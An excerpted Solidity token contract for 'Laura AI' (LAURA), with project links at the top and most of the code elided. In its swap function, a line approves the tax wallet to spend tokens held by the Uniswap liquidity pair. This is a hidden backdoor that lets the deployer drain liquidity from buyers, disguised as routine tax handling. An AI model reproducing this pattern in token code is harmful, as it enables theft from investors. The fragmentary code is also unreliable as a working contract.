/**
https://www.laura.finance/
https://app.laura.finance/
https://docs.laura.finance/

https://t.me/laura_finance
https://twitter.com/lauraai_fi
**/
...
contract LAURA is Context, IERC20, Ownable {
    ...
    string  private constant _name   = unicode"Laura AI";
    string  private constant _symbol = unicode"LAURA";
    uint8   private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000 * 10**_decimals;
    uint256 private constant _countTrigger = 100 * 10**_decimals;
    uint256 public  constant _taxSwapThreshold = 100 * 10**_decimals;
    uint256 public  constant _maxTaxSwap = 500000 * 10**_decimals;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) { 
            ...
            if (
                ...
                uint256 ethBalance = min(address(this).balance, 200000000000000000);
                uint256 contractETHBalance = address(this).balance - ethBalance;
    ...
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        ...
        _approve(uniswapV2Pair, address(_taxWallet), _maxTxAmount);
